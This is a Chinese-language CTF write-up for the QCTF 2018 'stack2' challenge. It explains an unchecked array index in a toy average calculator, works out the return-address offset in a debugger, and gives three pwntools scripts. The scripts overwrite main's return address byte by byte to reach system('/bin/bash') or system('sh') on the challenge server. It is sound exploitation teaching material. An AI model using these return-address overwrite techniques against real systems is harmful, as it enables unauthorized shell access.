# XCTF 4th-QCTF-2018-stack2

一道常规的通过栈溢出控制**EIP**从而改变程序path的题目

先检查一下获得的文件

```c
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

可知开启了NX和Canary防护，我们运行一下这个程序

```shell
***********************************************************
*                      An easy calc                       *
*Give me your numbers and I will return to you an average *
*(0 <= x < 256)                                           *
***********************************************************
How many numbers you have:
10
Give me your numbers
1
2
3
4
5
6
7
8
9
10
1. show numbers
2. add number
3. change number
4. get average
5. exit
```

大概就是一个求平均数的程序，我们用IDA Pro看一下反汇编代码

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  unsigned int v5; // [esp+18h] [ebp-90h]
  unsigned int v6; // [esp+1Ch] [ebp-8Ch]
  int v7; // [esp+20h] [ebp-88h]
  unsigned int j; // [esp+24h] [ebp-84h]
  int v9; // [esp+28h] [ebp-80h]
  unsigned int i; // [esp+2Ch] [ebp-7Ch]
  unsigned int k; // [esp+30h] [ebp-78h]
  unsigned int l; // [esp+34h] [ebp-74h]
  char v13[100]; // [esp+38h] [ebp-70h]
  unsigned int v14; // [esp+9Ch] [ebp-Ch]

  v14 = __readgsdword(0x14u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  v9 = 0;
  puts("***********************************************************");
  puts("*                      An easy calc                       *");
  puts("*Give me your numbers and I will return to you an average *");
  puts("*(0 <= x < 256)                                           *");
  puts("***********************************************************");
  puts("How many numbers you have:");
  __isoc99_scanf("%d", &v5);
  puts("Give me your numbers");
  for ( i = 0; i < v5 && (signed int)i <= 99; ++i )
  {
    __isoc99_scanf("%d", &v7);
    v13[i] = v7;
  }
  for ( j = v5; ; printf("average is %.2lf\n", (double)((long double)v9 / (double)j)) )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          puts("1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit");
          __isoc99_scanf("%d", &v6);
          if ( v6 != 2 )
            break;
          puts("Give me your number");
          __isoc99_scanf("%d", &v7);
          if ( j <= 0x63 )
          {
            v3 = j++;
            v13[v3] = v7;
          }
        }
        if ( v6 > 2 )
          break;
        if ( v6 != 1 )
          return 0;
        puts("id\t\tnumber");
        for ( k = 0; k < j; ++k )
          printf("%d\t\t%d\n", k, v13[k]);
      }
      if ( v6 != 3 )
        break;
      puts("which number to change:");
      __isoc99_scanf("%d", &v5);
      puts("new number:");
      __isoc99_scanf("%d", &v7);
      v13[v5] = v7;
    }
    if ( v6 != 4 )
      break;
    v9 = 0;
    for ( l = 0; l < j; ++l )
      v9 += v13[l];
  }
  return 0;
}
```

毫无头绪，我们先尝试搜索一下`flag`，`sysytem`，`cat`等常用字符串，看看能不能寻找到什么有用的线索，我们发现了`hackhere`函数

```
.text:0804859B                 public hackhere
.text:0804859B hackhere        proc near
.text:0804859B
.text:0804859B var_C           = dword ptr -0Ch
.text:0804859B
.text:0804859B ; __unwind {
.text:0804859B                 push    ebp
.text:0804859C                 mov     ebp, esp
.text:0804859E                 sub     esp, 18h
.text:080485A1                 mov     eax, large gs:14h
.text:080485A7                 mov     [ebp+var_C], eax
.text:080485AA                 xor     eax, eax
.text:080485AC                 sub     esp, 0Ch
.text:080485AF                 push    offset command  ; "/bin/bash"
.text:080485B4                 call    _system
.text:080485B9                 add     esp, 10h
.text:080485BC                 nop
.text:080485BD                 mov     edx, [ebp+var_C]
.text:080485C0                 xor     edx, large gs:14h
.text:080485C7                 jz      short locret_80485CE
.text:080485C9                 call    ___stack_chk_fail
```

```c
int hackhere()
{
  return system("/bin/bash");
}
```

我们现在大概有思路了，就是通过栈溢出控制程序的path到这个函数上就可以查看到**flag**了，现在来分析程序，可以看到两个溢出点

```c
for ( i = 0; i < v5 && (signed int)i <= 99; ++i )
  {
    __isoc99_scanf("%d", &v7);
    v13[i] = v7;
  }
```

```c
 puts("new number:");
      __isoc99_scanf("%d", &v7);
      v13[v5] = v7;
```

我们可以知道第一个溢出点是没有什么作用的，然后看看第二个溢出点，这里就是bug了，因为我们没有检查**v13**数组的边界，这里我们可以随意输入，然后劫持程序**EIP**，问题是这里的**v13**是**char**类型的数组，在**32**位系统中，一个**char**类型占用一个**1**字节，而地址是以**int**类型存储的，在**32**位系统中占用**4**字节，等于说我们需要把地址拆分成**4**个字节输入

我们知道我们需要达到的地址是：**0x080485AF**，在Linux中数据的存储的小端序结构，所以我们需要把这串地址反着拆成两个两个一组的组合：**0xAF**、**0x85**、**0x04**、**0x08**

这题的溢出点如果不是用`pattern.py`脚本计算而是手动计算的话有点小坑，我们的目标是修改**main**函数的返回地址到**0x080485AF**，所以我们需要找到存放**main**函数返回地址的内存与字符串数组内存的偏移量

我们注意到main函数开头和结尾的汇编代码

开头

`.text:080485D0                 lea     ecx, [esp+4]`

结尾

```
.text:080488EF                 lea     esp, [ecx-4]
.text:080488F2                 retn
```

可以知道最后**main**函数的返回值，是由**esp**决定的，而最后**esp**的值又是由**ecx**的值决定的，而**ecx**的值是由一开始**esp**的值决定的。由于我们通过静态分析，无法得知一开始时**esp**的内存位置，故当最后返回地址时**esp**的值我们也无法确定，我们需要通过动态调试才能得知一开始时**esp**的内存地址和最后返回的地址，计算得出偏移

**0xFFFFCEF8**是数组的地址，**0xFFFFCF7C**是存放`main`函数返回地址，故`pwndbg> p/x 0xffffcf7c-0xffffcef8
$1 = 0x84`，可以得出偏移量（溢出点）为**0x84**

所以Exploit为

```python
#!/usr/bin/python
#coding:utf-8
from pwn import*
system_addr=0x080485AF
leave_offset=0x84 
def write_addr(addr,va):
	io.sendline("3")
	io.recvuntil("which number to change:\n")
	io.sendline(str(addr))
	io.recvuntil("new number:\n")
	io.sendline(str(va))
	io.recvuntil("5. exit\n") 
io=remote('111.198.29.45','31725')
io.recvuntil("How many numbers you have:\n")
io.sendline("1")
io.recvuntil("Give me your numbers\n")
io.sendline("1")
io.recvuntil("5. exit\n")
# write  system_addr
write_addr(leave_offset,0XAF)
write_addr(leave_offset+1,0X85)
write_addr(leave_offset+2,0X04)
write_addr(leave_offset+3,0X08)
io.sendline("5")
io.interactive()
```

这个题有个坑点在于题目给出了`getshell`的函数，但是出题人在搭建**docker**环境时未注意，环境中只给了`sh`，在发现问题后考虑到题目依然可解就未再次更改环境。题目依然是简单的栈溢出，只不过不能直接跳转到`getshell`，需要简单的**ROP**一下，我们只需要找到`system`函数的调用地址和`bin/sh`的字符串地址即可

最终的Exploit为

```python
#!/usr/bin/python
#coding:utf-8
from pwn import*
system_addr=0x080485AF
leave_offset=0x84
def write_addr(addr,va):
	io.sendline("3")
	io.recvuntil("which number to change:\n")
	io.sendline(str(addr))
	io.recvuntil("new number:\n")
	io.sendline(str(va))
	io.recvuntil("5. exit\n")
io=remote('111.198.29.45','31725')
io.recvuntil("How many numbers you have:\n")
io.sendline("1")
io.recvuntil("Give me your numbers\n")
io.sendline("1")
io.recvuntil("5. exit\n")
# write  system_addr  0x08048450
write_addr(leave_offset,0X50)
write_addr(leave_offset+1,0X84)
write_addr(leave_offset+2,0X04)
write_addr(leave_offset+3,0X08)
# sh_addr  0x08048987
leave_offset+=8
print leave_offset
write_addr(leave_offset,0x87)
write_addr(leave_offset+1,0X89)
write_addr(leave_offset+2,0X04)
write_addr(leave_offset+3,0X08)
io.sendline("5")
io.interactive()
```

或者

```python
from pwn import *

g_local=True
context.log_level='debug'

if g_local:
	sh = process('./stack2')#env={'LD_PRELOAD':'./libc.so.6'}
	gdb.attach(sh)
else:
	sh = remote("47.96.239.28", 2333)

def write_byte(off, val):
	sh.send("3\n")
	sh.recvuntil("which number to change:\n")
	sh.send(str(off) + "\n")
	sh.recvuntil("new number:\n")
	sh.send(str(val) + "\n")
	sh.recvuntil("5. exit\n")

def write_dword(off, val):
	write_byte(off, val & 0xff)
	write_byte(off + 1, (val >> 8) & 0xff)
	write_byte(off + 2, (val >> 16) & 0xff)
	write_byte(off + 3, (val >> 24) & 0xff)

def exit():
	sh.send("5\n")
	sh.interactive()

sh.recvuntil("How many numbers you have:\n")
sh.send("1\n")
sh.recvuntil("Give me your numbers\n")
sh.send("1\n")
sh.recvuntil("5. exit\n")

write_dword(0x84, 0x8048450)
write_dword(0x8C, 0x8048980 + 7)
exit()
```

